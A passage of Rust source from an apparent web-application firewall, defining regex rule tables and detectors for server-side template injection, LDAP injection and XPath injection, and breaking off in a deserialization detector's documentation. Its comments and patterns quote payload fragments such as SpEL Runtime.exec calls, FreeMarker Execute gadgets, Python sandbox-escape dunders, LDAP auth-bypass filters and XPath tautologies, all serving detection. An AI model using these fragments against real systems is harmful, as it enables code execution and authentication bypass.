        Self::new()
    }
}

impl SemanticDetector for NoSqlStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::NoSqlStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::NoSqlInjection, "NoSQL"))
    }
}

// ── SSTI (server-side template injection) structural detector (plan §T2-C) ────

/// SSTI structural rule table (plan T2-C). Matches expression-delimiter +
/// dangerous-sink **co-occurrence** and polyglot exec sinks on the **normalised
/// view text** — the same `lower_trunc` surface every other structural detector
/// uses. Patterns are authored lowercase because the view text is lowercased
/// (`T(java.lang.Runtime)` reaches the detector as `t(java.lang.runtime)`).
///
/// **No template engine is built or invoked, and there is no parser at all** —
/// every rule is a single [`regex`] scan over the already length/token-bounded
/// preprocessor output, so there is no recursion and therefore no stack-overflow
/// / expansion `DoS` surface (the P0 red-line's depth-bound requirement applies to
/// recursive parsers; a pure-regex detector has none). Jinja2 / Freemarker /
/// Velocity / Thymeleaf / ERB each have an incompatible grammar and there is no
/// universal template AST, so per the plan we deliberately do **not** parse: we
/// match the expression delimiters (`{{…}}` / `${…}` / `#{…}` / `<%…%>` /
/// `*{…}` / `<#…>` / `#set(…)`) together with the exec/reflection/sandbox-escape
/// sinks that turn a template expression into code execution.
///
/// **Honest boundary (RASP ceiling).** A pure reverse proxy sees only the
/// payload; it can never confirm the field is actually evaluated by a template
/// engine on the backend (`{{7*7}}` is only known to be SSTI once something
/// renders it to `49`). These rules therefore judge whether the payload *looks
/// structurally like* SSTI, not whether the template truly evaluated it — the
/// same input-side ceiling the plan §二.2 calls out for every Lane 2 detector.
///
/// **FP discipline (SSTI is the worst FP family).** Bare `{{ }}` / `${ }` /
/// `#{ }` delimiters are *everywhere* in legitimate content — JS template
/// literals (`${t('key')}` i18n!), Angular / Vue interpolation, SCSS/CSS-in-JS,
/// shell `${VAR}`, Ruby string interpolation — so **every bare-delimiter rule is
/// default-off**. Default-**on** ships only the strong signals: an exec/reflection
/// sink that is essentially never benign in request data
/// (`freemarker.template.utility.Execute`, `T(java.…)` / `T (java.…)` `SpEL` type
/// evaluator, `javax.script.ScriptEngine…`, `getClass().forName(`, `__import__(`,
/// the Python sandbox-escape dunders), or a delimiter that *co-occurs* with such a
/// sink (`{{…config.items…}}`, `<%… system(…) %>`, `{%… _self.env… %}` /
/// `{% import os %}`). Bare delimiters, `{{7*7}}` arithmetic probes, lone
/// `.__class__`, lone `getClass(` and bare FreeMarker/Velocity directives ship
/// default-off pending holdout calibration.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const SSTI_RULES: &[RuleRow] = &[
    // FreeMarker's canonical RCE gadget: the `Execute` utility class, reached via
    // `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`. The
    // fully-qualified class path is essentially never benign in request data.
    // DEFAULT-ON, highest confidence.
    (
        "ssti.freemarker_exec",
        95,
        r"freemarker\.template\.utility\.execute",
        RuleKind::Presence,
        true,
    ),
    // SpEL / JSP-EL / Thymeleaf type evaluator into a `java.*` package:
    // `${T(java.lang.Runtime).getRuntime().exec(…)}` /
    // `*{T(java.lang.ProcessBuilder)…}`. `\bt\s*\(` matches a standalone `t(`
    // token (a word boundary precedes the `t`) **with or without whitespace before
    // the paren** — SpEL tolerates `T (java.lang.Runtime)` and attackers use the
    // spaced form to slip a strict `t(` blocklist (FN, audit A). `format(java…)` /
    // `insert(java…)` still do NOT match (no word boundary before the `t`); `t(java.`
    // / `t (java.` as a lone token is the SpEL type-evaluator primitive and is
    // essentially never benign. Catches the sink with or without an enclosing
    // delimiter. DEFAULT-ON. Note this is intentionally narrower than a bare
    // `${t(…)}` rule, which would false-positive on the ubiquitous i18n `${t('key')}`
    // JS-template idiom.
    (
        "ssti.spel_type_java",
        90,
        r"\bt\s*\(\s*java\.",
        RuleKind::Presence,
        true,
    ),
    // `javax.script.ScriptEngine[Manager]` reflection RCE gadget: the Java scripting
    // API a template / SpEL / OGNL payload reaches to evaluate attacker JS
    // (`new javax.script.ScriptEngineManager().getEngineByName("js").eval(…)`, FN,
    // audit A). A fully-qualified `javax.script.scriptengine…` classpath in request
    // data is essentially never benign — the same fully-qualified-gadget discipline
    // as `freemarker.template.utility.execute`. DEFAULT-ON.
    (
        "ssti.javax_script_engine",
        88,
        r"javax\.script\.scriptengine",
        RuleKind::Presence,
        true,
    ),
    // Jinja2 / Twig **statement block** `{% … %}` carrying a dangerous sink
    // (co-occurrence, FN, audit A). The tag-statement delimiter differs from the
    // `{{ … }}` expression delimiter and previously had no rule at all, so
    // `{% import os %}` / `{% set x = _self.env… %}` slipped through. FP discipline:
    // a **bare** `{% … %}` (the ubiquitous `{% if %}` / `{% for %}` / `{% block %}`
    // control flow and `{% include 'tpl.html' %}` / `{% import 'forms.html' %}`
    // template composition) must NOT fire — only the co-occurrence with a genuine
    // exec / sandbox-escape sink (a `__dunder`, Twig `_self.`, `system(` / `popen` /
    // `subprocess`, an `os.`/`getruntime` call, or a Python module `import os` /
    // `import subprocess` …) does. `[^%]{0,200}?` cannot span the closing `%`,
    // bounding the scan. DEFAULT-ON.
    (
        "ssti.jinja_statement_sink",
        85,
        r"\{%[^%]{0,200}?(\b__|_self\.|\bsystem\s*\(|\bpopen|\bsubprocess|\bos\.|\bgetruntime|\bimport\s+(os|subprocess|sys|commands|platform|socket|pty)\b)",
        RuleKind::Presence,
        true,
    ),
    // Java reflection gadget `getClass().forName("java.lang.Runtime")` used by the
    // Velocity / SpEL / OGNL exec chains. The `getClass().forName(` pair is a
    // reflection-into-classloader move essentially never present in benign request
    // data (a lone `getClass(` is not — see the default-off `ssti.getclass` rule).
    // DEFAULT-ON.
    (
        "ssti.java_reflect_forname",
        90,
        r"\.getclass\s*\(\s*\)\s*\.\s*forname\b",
        RuleKind::Presence,
        true,
    ),
    // Jinja2 / Flask sink **inside** the `{{ … }}` delimiter (co-occurrence). The
    // `{{ }}` gate + a Jinja SSTI accessor (`config.items()`, `request.application`,
    // `self.__init__`, `.__class__`, `cycler.__init__`, `lipsum.__globals__`,
    // `get_flashed_messages`) is the canonical Flask/Jinja SSTI shape and is
    // essentially never benign — the delimiter requirement keeps ordinary prose
    // that merely mentions `config` from firing. DEFAULT-ON.
    (
        "ssti.jinja_sink",
        88,
        r"\{\{[^}]{0,200}?(config\.items|request\.application|self\.__init__|\.__class__|cycler\.__init__|lipsum\.__globals__|get_flashed_messages)",
        RuleKind::Presence,
        true,
    ),
    // Python sandbox-escape dunder chain — `__mro__` / `__subclasses__` /
    // `__bases__` / `__globals__`. These object-graph-walk dunders are the payload
    // core of every Jinja / Python SSTI and pyjail escape (`''.__class__.__mro__[1]
    // .__subclasses__()[…]`); they essentially never occur in benign HTTP input.
    // DEFAULT-ON. (`__class__` / `__init__` alone are noisier and gated behind the
    // `{{ }}` delimiter in `ssti.jinja_sink`, or default-off in `ssti.py_class`.)
    (
        "ssti.py_sandbox_dunder",
        85,
        r"\b__(mro|subclasses|bases|globals)__\b",
        RuleKind::Presence,
        true,
    ),
    // ERB / JSP / ASP scriptlet `<% … %>` or `<%= … %>` **co-occurring** with an
    // exec sink (`system(`, a backtick command, `Runtime`, `.exec(`, `eval(`). A
    // server-script scriptlet carrying a shell/exec primitive in request data is
    // the ERB/JSP SSTI shape; the scriptlet + sink co-occurrence keeps it off
    // ordinary text. `[^%]{0,200}?` cannot span another `%`, bounding the scan.
    // DEFAULT-ON.
    (
        "ssti.erb_scriptlet_exec",
        82,
        r"<%=?[^%]{0,200}?(system\s*\(|`|\bruntime\b|\.exec\s*\(|\beval\s*\()",
        RuleKind::Presence,
        true,
    ),
    // Python `__import__('os')` primitive — the import-then-exec SSTI bootstrap.
    // `__import__(` in web input is essentially never benign. DEFAULT-ON.
    ("ssti.py_import", 82, r"\b__import__\s*\(", RuleKind::Presence, true),
    // ── default-off (high-noise, holdout calibration pending) ────────────────
    // `getClass(` alone — the reflection entry point, but it also appears in benign
    // Java code snippets / discussions, so it is default-off; the strong
    // `getClass().forName(` chain is default-on above.
    ("ssti.getclass", 50, r"\.getclass\s*\(", RuleKind::Presence, false),
    // Bare FreeMarker / Velocity directive (`<#assign …>` / `<#list …>` /
    // `#set(…)`). Suspicious in request data but occasionally legitimate template
    // source; default-off until calibrated.
    (
        "ssti.template_directive",
        45,
        r"<#(assign|list|if|macro|import)\b|#set\s*\(",
        RuleKind::Presence,
        false,
    ),
    // `{{ 7*7 }}` arithmetic probe. The evaluation probe attackers send first, but
    // Angular / Vue templates legitimately carry `{{ price * qty }}`; default-off.
    (
        "ssti.jinja_arith_probe",
        45,
        r"\{\{\s*\d{1,6}\s*\*\s*\d{1,6}\s*\}\}",
        RuleKind::Presence,
        false,
    ),
    // Lone `.__class__` (outside a `{{ }}` delimiter). Appears in Python code and
    // documentation, so default-off; the `{{ }}`-gated form is default-on via
    // `ssti.jinja_sink`.
    ("ssti.py_class", 40, r"\.__class__\b", RuleKind::Presence, false),
    // Bare `{{ … }}` interpolation delimiter — Vue / Angular / Handlebars /
    // mustache use it pervasively; hugely noisy alone, default-off.
    (
        "ssti.jinja_delim",
        30,
        r"\{\{[^}]{1,100}\}\}",
        RuleKind::Presence,
        false,
    ),
    // Bare `${ … }` delimiter — JS template literals, shell `${VAR}`, FreeMarker /
    // JSP-EL interpolation; the noisiest possible signal, default-off.
    ("ssti.dollar_delim", 25, r"\$\{[^}]{1,100}\}", RuleKind::Presence, false),
    // Bare `#{ … }` delimiter — Ruby string interpolation, Thymeleaf, SCSS;
    // default-off.
    ("ssti.hash_delim", 25, r"#\{[^}]{1,100}\}", RuleKind::Presence, false),
];

/// Structural SSTI (server-side template injection) detector (plan T2-C).
///
/// Registered in the `Ssti` attack family; matches on the normalised view text.
/// Single-detector family — no corroboration partner — so FP control is by narrow
/// default-on rules (exec/reflection/sandbox sinks + delimiter-gated co-occurrence)
/// plus default-off high-noise bare-delimiter rules, per the plan §四.3 invariant.
/// Runs **no** template parser: pure bounded-regex scan, no recursion, no
/// stack-overflow / expansion `DoS` surface.
pub struct SstiStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl SstiStructuralDetector {
    /// Compile the **default-on** rules (exec/reflection/sandbox sinks and the
    /// delimiter-gated co-occurrence rules). The high-noise bare-delimiter,
    /// arithmetic-probe, lone-`getClass(`, lone-`.__class__` and bare-directive
    /// rules await holdout calibration and are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(SSTI_RULES, false, "SstiStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(SSTI_RULES, true, "SstiStructuralDetector"),
        }
    }
}

impl Default for SstiStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for SstiStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::SstiStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::Ssti, "SSTI"))
    }
}

// ── LDAP injection structural detector (plan §T2-D) ──────────────────────────

/// LDAP search-filter injection structural rule table (plan T2-D). Matches
/// **structural filter-break signatures** — a payload that closes an existing
/// filter clause and re-opens a new one (`)(uid=*`, `*)(|(`, `)(&(`), plus the
/// LDAP hex-escape and null-byte evasion variants — on the **normalised view
/// text** (the same `lower_trunc` surface every other structural detector uses,
/// so attribute names arrive lowercased: `objectClass` reaches the detector as
/// `objectclass`).
///
/// **No LDAP parser is built or invoked, and there is no parser at all** — every
/// rule is a single [`regex`] scan over the already length/token-bounded
/// preprocessor output. The `regex` crate compiles to a finite automaton with
/// **no backtracking**, so match time is linear in the input regardless of the
/// payload; combined with the fact that every quantifier here is a single bounded
/// char-class star (`\s*`) or a bounded `{0,n}` repetition — never a nested
/// quantifier — there is no catastrophic-backtracking (`ReDoS`) and no recursion,
/// hence no stack-overflow / expansion `DoS` surface (the P0 depth-bound red-line
/// targets recursive parsers; a pure-regex detector has none).
///
/// **Honest boundary (RASP ceiling).** A pure reverse proxy sees only the payload
/// and can never confirm the backend actually issues an LDAP search against it —
/// the same field could feed a SQL query, a log line, or nothing. These rules
/// therefore judge whether a payload *looks structurally like* an LDAP filter
/// injection, not whether an LDAP query truly consumed it — the same input-side
/// ceiling the plan §二.2 calls out for every Lane 2 detector.
///
/// **FP discipline (LDAP metacharacters are ubiquitous).** The LDAP filter
/// metacharacters `*` `(` `)` `&` `|` recur *everywhere* in legitimate text, URLs
/// and code — a bare `*` wildcard, a lone `(` / `)`, a bare `|` / `&` carry almost
/// no signal, so **every bare-metacharacter rule is default-off**. Default-**on**
/// ships only the *structural co-occurrence* signals that are essentially never
/// benign in request data: a filter-clause close **immediately followed by** a new
/// clause open carrying a logical operator (`)(|(`, or the empty-filter `)(&)`) or
/// an attribute assignment (`)(uid=`), the canonical wildcard auth-bypass (`*)(uid=*`), the hex-escaped
/// filter break (`\29\28`) and the null-byte filter truncation (`))\00`). The
/// generic `)(<any-attr>=` break, the bare `(|(` grouping and the lone
/// metacharacters ship default-off pending holdout calibration.
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const LDAP_RULES: &[RuleRow] = &[
    // Filter-break into a logical operator: a clause close `)` immediately
    // re-opened as a boolean sub-filter that either nests another clause `(|(` /
    // `(&(` / `(!(` or closes empty `)(&)` / `)(|)` / `)(!)` (the always-true /
    // always-false empty-filter auth-bypass, e.g. `admin)(&)`). Injecting a logical
    // operator to widen, invert or short-circuit the search is the LDAP-injection
    // primitive and this `)(<op>(`-or-`)(<op>)` shape is essentially never benign in
    // request data. DEFAULT-ON, highest confidence.
    (
        "ldap.filter_break_logical",
        90,
        r"\)\s*\(\s*[|&!]\s*[()]",
        RuleKind::Presence,
        true,
    ),
    // Canonical wildcard authentication bypass `*)(uid=*` / `*)(cn=*` — a trailing
    // wildcard closes the current clause, then a new attribute clause is opened
    // with a `=*` match-anything. The `*)(<attr>=*` shape is the textbook LDAP
    // auth-bypass and is never benign. DEFAULT-ON.
    (
        "ldap.auth_bypass_wildcard",
        90,
        r"\*\s*\)\s*\(\s*[a-z][a-z0-9;.-]{0,62}\s*=\s*\*",
        RuleKind::Presence,
        true,
    ),
    // Filter-break into a **known LDAP attribute** clause: `)(uid=`, `)(cn=`,
    // `)(objectclass=`, `)(userpassword=`, … A clause close re-opened onto a
    // directory attribute assignment is the LDAP-injection shape; restricting the
    // attribute to the well-known directory schema names keeps this default-on
    // narrow (the generic `)(<any-ident>=` form is default-off below). The list
    // spans the common inetOrgPerson / posixAccount / Active-Directory attributes an
    // injection targets — identity (`uid`/`cn`/`sn`/`givenname`/`displayname`),
    // credential (`userpassword`), contact (`mail`/`telephonenumber`), group
    // (`memberof`/`member`), AD (`samaccountname`/`userprincipalname`/
    // `distinguishedname`) and POSIX (`uidnumber`/`gidnumber`/`homedirectory`)
    // schema (audit A attribute-whitelist FN). DEFAULT-ON.
    (
        "ldap.filter_break_known_attr",
        88,
        r"\)\s*\(\s*(uid|cn|sn|givenname|displayname|objectclass|userpassword|mail|telephonenumber|memberof|member|samaccountname|userprincipalname|distinguishedname|uidnumber|gidnumber|homedirectory|title|ou|dc)\s*=",
        RuleKind::Presence,
        true,
    ),
    // Hex-escaped filter break `\29\28` — the LDAP RFC-4515 escape of `)(`, used to
    // slip a filter break past a naive literal-`)(` blocklist. The escaped
    // close-then-open pair is an evasion signature with no benign meaning in
    // request data. DEFAULT-ON. (`\29` is `)`, `\28` is `(`; the view text keeps the
    // literal backslash-escape since it is not URL/entity encoding.)
    ("ldap.hex_escape_break", 85, r"\\29\s*\\28", RuleKind::Presence, true),
    // Hex-escaped filter-metacharacter **pair** — any two adjacent RFC-4515 escapes
    // among `\28` `(`, `\29` `)`, `\2a` `*` (audit A: the specific `\29\28` rule
    // above missed the wildcard-bearing combos `\2a\29` / `\28\2a` / `\29\2a` and
    // the reversed `\28\29`). Two adjacent hex-escaped filter metacharacters are an
    // RFC-4515 evasion sequence with no benign meaning in request data (a lone `\2a`
    // is not — it needs a second adjacent escape). Confidence sits just below the
    // specific `\29\28` rule so that exact break still reports as
    // `ldap.hex_escape_break`. DEFAULT-ON.
    (
        "ldap.hex_escape_meta_pair",
        82,
        r"\\2[89a]\s*\\2[89a]",
        RuleKind::Presence,
        true,
    ),
    // Null-byte filter truncation `))\00` — a NUL after clause-close bytes
    // truncates the remainder of the filter the application appended, a classic
    // LDAP-injection / auth-bypass tail. Matches both an actual NUL and the literal
    // `\00` escape form. `))` alone is ubiquitous (nested calls), so the NUL is the
    // load-bearing, essentially-never-benign token. DEFAULT-ON.
    (
        "ldap.null_byte_truncation",
        80,
        r"\)\s*\)\s*(\\00|\x00)",
        RuleKind::Presence,
        true,
    ),
    // ── default-off (high-noise, holdout calibration pending) ────────────────
    // Generic filter break `)(<any-ident>=` — the structural signal, but a
    // non-directory identifier widens the FP surface (some config/query DSLs use
    // `)(name=`), so it is default-off until calibrated; the known-attribute form
    // is default-on above.
    (
        "ldap.filter_break_any_attr",
        60,
        r"\)\s*\(\s*[a-z][a-z0-9;.-]{0,62}\s*=",
        RuleKind::Presence,
        false,
    ),
    // Bare boolean-group open `(|(` / `(&(` — legitimate LDAP filter grammar, and
    // it can also arise in ordinary parenthesised text; too noisy alone,
    // default-off.
    ("ldap.filter_group", 35, r"\(\s*[|&]\s*\(", RuleKind::Presence, false),
    // Bare `)(` clause adjacency without an attribute/operator — appears in
    // ordinary text (`(foo)(bar)`) and curried calls; default-off.
    ("ldap.paren_adjacency", 25, r"\)\s*\(", RuleKind::Presence, false),
    // Bare `*` wildcard — ubiquitous (globs, multiplication, markdown emphasis);
    // the noisiest possible LDAP signal, default-off.
    ("ldap.bare_wildcard", 20, r"\*", RuleKind::Presence, false),
    // Bare boolean metacharacter `|` / `&` — pervasive in prose, URLs (`a&b`) and
    // code; carries essentially no signal alone, default-off.
    ("ldap.bare_logical", 20, r"[|&]", RuleKind::Presence, false),
];

/// Structural LDAP search-filter injection detector (plan T2-D).
///
/// Registered in the `LdapInjection` attack family; matches on the normalised
/// view text. Single-detector family — no corroboration partner — so FP control
/// is by narrow default-on rules (structural filter-break co-occurrence + escape /
/// null-byte evasion signatures) plus default-off high-noise bare-metacharacter
/// rules, per the plan §四.3 invariant. Runs **no** LDAP parser: a pure
/// bounded-regex scan over a backtracking-free automaton, so no recursion, no
/// `ReDoS`, no stack-overflow surface.
pub struct LdapStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl LdapStructuralDetector {
    /// Compile the **default-on** rules (the structural filter-break, wildcard
    /// auth-bypass, hex-escape and null-byte signatures). The high-noise generic
    /// break, bare-group and lone-metacharacter rules await holdout calibration and
    /// are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(LDAP_RULES, false, "LdapStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(LDAP_RULES, true, "LdapStructuralDetector"),
        }
    }
}

impl Default for LdapStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for LdapStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::LdapStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::LdapInjection, "LDAP"))
    }
}

// ── XPath injection structural detector (plan §T2-E) ─────────────────────────

/// `XPath` / `XQuery` injection structural rule table (plan T2-E). Matches
/// **structural `XPath`-injection signatures** — a payload that closes an existing
/// location-step / predicate / string literal and re-opens a new node path or a
/// tautology to subvert node selection or bypass authentication — on the
/// **normalised view text** (the same `lower_trunc` surface every other
/// structural detector uses, so `count(//` reaches the detector lowercased).
///
/// **No `XPath` parser is built or invoked, and there is no parser at all** — every
/// rule is a single [`regex`] scan over the already length/token-bounded
/// preprocessor output. The `regex` crate compiles to a finite automaton with
/// **no backtracking**, so match time is linear in the input regardless of the
/// payload; every quantifier here is a single bounded char-class star (`\s*`) or
/// a bounded `{0,n}` repetition — never a nested quantifier — so there is no
/// catastrophic-backtracking (`ReDoS`) and no recursion, hence no
/// stack-overflow / expansion `DoS` surface (the P0 depth-bound red-line targets
/// recursive parsers; a pure-regex detector has none).
///
/// **Honest boundary (RASP ceiling).** A pure reverse proxy sees only the payload
/// and can never confirm the backend actually evaluates an `XPath` / `XQuery`
/// expression against it — the same field could feed a SQL query, a log line, or
/// nothing. These rules therefore judge whether a payload *looks structurally
/// like* an `XPath` injection, not whether an `XPath` query truly consumed it — the
/// same input-side ceiling the plan §二.2 calls out for every Lane 2 detector.
/// (The quote-closed tautology `' or '1'='1` deliberately overlaps the `SQLi`
/// tautology; the two families record independently, which is fine — the payload
/// is structurally a tautology-injection whichever backend consumes it.)
///
/// **FP discipline (`XPath` tokens are ubiquitous).** The bare `XPath` tokens `//`
/// (URLs, comments, paths), the logical words `or` / `and` (prose), the lone
/// predicate brackets `[` / `]` (array access) and the bare function calls
/// `count(` / `substring(` (ordinary programming) recur *everywhere* in
/// legitimate text, URLs and code — a bare token carries almost no signal, so
/// **every bare-token rule is default-off**. Default-**on** ships only the
/// *structural co-occurrence* signals that are essentially never benign in
/// request data: a node-axis union (`] | //`), a quote-closed tautology
/// (`' or '1'='1`), a predicate/quote close re-opened onto a logical operator
/// (`'] or`), a logical operator immediately calling an `XPath` node function
/// (`' or position()`, `or count(`), an `XPath` string function whose argument is
/// an absolute axis (`count(//`, `substring(name(`), and a node axis with a
/// functional predicate (`//*[contains(`).
///
/// `(rule_key, confidence, pattern, kind, default_on)`.
const XPATH_RULES: &[RuleRow] = &[
    // Node-axis union / step injection: a predicate close `]` re-opened as a new
    // absolute location path `//` via the XPath union operator `|`. The
    // `] | //` shape injects an entirely new node set into the result and is
    // essentially never benign in request data. DEFAULT-ON, highest confidence.
    ("xpath.node_axis_union", 90, r"\]\s*\|\s*//", RuleKind::Presence, true),
    // Auth-bypass via a logical operator immediately calling an XPath node
    // function: `' or position()`, `and last()`, `or name()=`. The XPath-distinctive
    // node functions (`position`/`last`/`name`/`local-name`) fire behind an `or`/`and`
    // on their own — they are near-unique to XPath. The aggregate/string functions
    // `count`/`string-length` are also ordinary English/SQL words (`… or count(items)`,
    // `sum or count(*)`), so they require a following absolute-axis argument
    // (`or count(//`, `or count(/`) — the blind-XPath extraction shape — instead of a
    // bare `or count(`. DEFAULT-ON.
    (
        "xpath.auth_bypass_func",
        90,
        r"\b(?:or|and)\s+(?:position|last|name|local-name)\s*\(|\b(?:or|and)\s+(?:count|string-length)\s*\(\s*/",
        RuleKind::Presence,
        true,
    ),
    // Quote-closed tautology `' or '1'='1` / `" or "1"="1` — the injected input
    // closes the string literal and appends an always-true quoted comparison to
    // widen node selection past the intended predicate. Both compared operands are a
    // SINGLE alphanumeric char (`'1'='1`, `'a'='a`): the canonical tautology form.
    // Requiring single-char operands drops the legitimate faceted-search shape
    // `author='smith' and 'year'='2020'` (multi-char, distinct field/value operands)
    // that the old `[a-z0-9]+` matched, while keeping the never-benign `'x'='x` payload.
    // DEFAULT-ON. (Overlaps the SQLi family by design; see the type doc.)
    (
        "xpath.quote_tautology",
        88,
        r#"['"]\s*(?:or|and)\s*['"]\s*[a-z0-9]\s*['"]?\s*=\s*['"]?\s*[a-z0-9]"#,
        RuleKind::Presence,
        true,
    ),
    // XPath string function whose argument is an absolute axis or a nested node
    // function: `count(//`, `string-length(//`, `substring(name(`,
    // `contains(local-name(`. A string/aggregate function pulling from an absolute
    // `//` axis (or `name(` / `local-name(`) is a blind-XPath extraction primitive
    // and is never benign in request data. DEFAULT-ON.
    (
        "xpath.func_axis",
        88,
        r"\b(?:count|string-length|substring|substring-before|substring-after|contains|starts-with|concat|normalize-space)\s*\(\s*(?://|name\s*\(|local-name\s*\()",
        RuleKind::Presence,
        true,
    ),
    // Predicate / quote close re-opened onto a logical operator: `'] or`, `")] and`,
    // `'] and`. The input closes the intended string literal and predicate, then
    // chains a boolean clause to alter the surviving node set. The `close-then-logic`
    // co-occurrence is the injection shape; bare `]` or bare `or` alone are
    // default-off. DEFAULT-ON.
    (
        "xpath.predicate_close_logic",
        85,
        r#"['"]\s*\)?\s*\]\s*(?:or|and)\b"#,
        RuleKind::Presence,
        true,
    ),
    // Node axis with a functional predicate: `//*[contains(`, `//user[position(`,
    // `//book[starts-with(`. An absolute axis whose predicate opens an XPath
    // string/position function is a node-enumeration / blind-extraction shape.
    // A bare `//`, a bare `[`, or a bare `contains(` alone are default-off; their
    // co-occurrence here is the signal. DEFAULT-ON.
    (
        "xpath.axis_predicate_func",
        85,
        r"//[a-z0-9_*.:@-]{0,64}\[\s*(?:contains|starts-with|count|position|string-length|substring|text|node)\s*\(",
        RuleKind::Presence,
        true,
    ),
    // ── default-off (high-noise, holdout calibration pending) ────────────────
    // Bare absolute-axis `//` — ubiquitous in URLs (`http://`), comments and file
    // paths; the noisiest possible XPath signal, default-off.
    ("xpath.bare_double_slash", 25, r"//", RuleKind::Presence, false),
    // Bare logical word `or` / `and` — pervasive in ordinary prose; carries
    // essentially no signal alone, default-off.
    ("xpath.bare_logical", 20, r"\b(?:or|and)\b", RuleKind::Presence, false),
    // Bare predicate bracket `[` / `]` — ordinary array / index access
    // (`items[0]`); default-off.
    ("xpath.bare_predicate", 15, r"[\[\]]", RuleKind::Presence, false),
    // Bare XPath-ish function call `count(` / `substring(` / `string-length(` —
    // legitimate in most programming languages; default-off.
    (
        "xpath.bare_func",
        20,
        r"\b(?:count|substring|string-length)\s*\(",
        RuleKind::Presence,
        false,
    ),
];

/// Structural `XPath` / `XQuery` injection detector (plan T2-E).
///
/// Registered in the `XpathInjection` attack family; matches on the normalised
/// view text. Single-detector family — no corroboration partner — so FP control
/// is by narrow default-on rules (structural node-axis / tautology / close-then-
/// logic / function-axis co-occurrence signatures) plus default-off high-noise
/// bare-token rules, per the plan §四.3 invariant. Runs **no** `XPath` parser: a
/// pure bounded-regex scan over a backtracking-free automaton, so no recursion,
/// no `ReDoS`, no stack-overflow surface.
pub struct XpathStructuralDetector {
    rules: Vec<CompiledRule>,
}

impl XpathStructuralDetector {
    /// Compile the **default-on** rules (the node-axis union, tautology,
    /// close-then-logic, auth-bypass-function, function-axis and axis-predicate
    /// signatures). The high-noise bare-token rules await holdout calibration and
    /// are not compiled.
    #[must_use]
    pub fn new() -> Self {
        Self {
            rules: compile_table(XPATH_RULES, false, "XpathStructuralDetector"),
        }
    }

    /// Test-only: compile **every** rule, including the default-off ones.
    #[cfg(test)]
    #[must_use]
    pub fn with_all_rules() -> Self {
        Self {
            rules: compile_table(XPATH_RULES, true, "XpathStructuralDetector"),
        }
    }
}

impl Default for XpathStructuralDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl SemanticDetector for XpathStructuralDetector {
    fn id(&self) -> DetectorId {
        DetectorId::XpathStruct
    }

    fn detect(
        &self,
        view: &View<'_>,
        _ctx: &PreprocessCtx<'_>,
        _state: &mut ContentInspectionState,
    ) -> Option<DetectionFinding> {
        let rule = best_match(&self.rules, view.lower_trunc.as_str())?;
        Some(finding_for(rule, AttackKind::XpathInjection, "XPath"))
    }
}

// ── Unsafe-deserialization structural detector (plan §T2-F) ──────────────────

/// Unsafe / insecure deserialization structural rule table (plan T2-F). Matches
/// **cross-language serialized-object-injection / gadget-chain signatures** — the
/// serialization *format magic* (a Java stream header, a PHP `serialize()` object
/// header, a Python `pickle` `GLOBAL`-opcode reduction, a .NET `BinaryFormatter`
/// header) plus the **known exploit gadget class / dangerous opcode** that makes a
/// serialized blob weaponisable — on the **normalised view text** (the same
/// `lower_trunc` surface every other structural detector uses).
///
/// **This is a signature / feature match, NOT deserialization.** No language
/// deserializer is ever invoked and there is **no parser at all** — every rule is a
/// single [`regex`] scan over the already length/token-bounded preprocessor output.
/// The `regex` crate compiles to a finite automaton with **no backtracking**, so
/// match time is linear in the input regardless of the payload; every quantifier
/// here is a single bounded char-class star (`\s*` / `\s+`) or a bounded `{m,n}`
/// repetition — never a nested quantifier — so there is no catastrophic-backtracking
/// (`ReDoS`) and no recursion, hence no stack-overflow / expansion `DoS` surface
/// (the P0 depth-bound red-line targets recursive parsers; a pure-regex detector has
/// none).
///
/// **Decode-chain reuse.** Serialized payloads are routinely base64/hex-wrapped, so
/// the strongest signals are authored to hit on **both** the raw view and the
/// base64/hex **decoded** views the preprocessor already emits (each stamped
/// [`super::preprocess::Provenance::BlindDecoded`] — never hard-veto). The Java
/// stream base64 prefix `rO0AB…` (magic `\xAC\xED\x00\x05` base64-encoded, here
/// lowercased to `ro0ab`) and the .NET `BinaryFormatter` base64 header
/// `AAEAAAD/////` are **directly matchable base64 tokens** that fire on the raw view
/// with no decode needed; a base64-wrapped Python pickle instead surfaces its
/// `GLOBAL`-opcode → `system`/`eval` reduction only after the preprocessor's blind
/// base64 decode, where this table matches it on the decoded view. (The raw binary
/// magic bytes themselves are lossy-converted to `U+FFFD` on the UTF-8 view surface,
/// so the base64/hex text forms — not the raw bytes — are the reliable signals.)
///
/// **Honest boundary (RASP ceiling).** A pure reverse proxy sees only the payload
/// and can never confirm the backend actually **deserializes** it — a Java magic, a
/// gadget class name or a pickle opcode could equally sit inertly inside a log line,
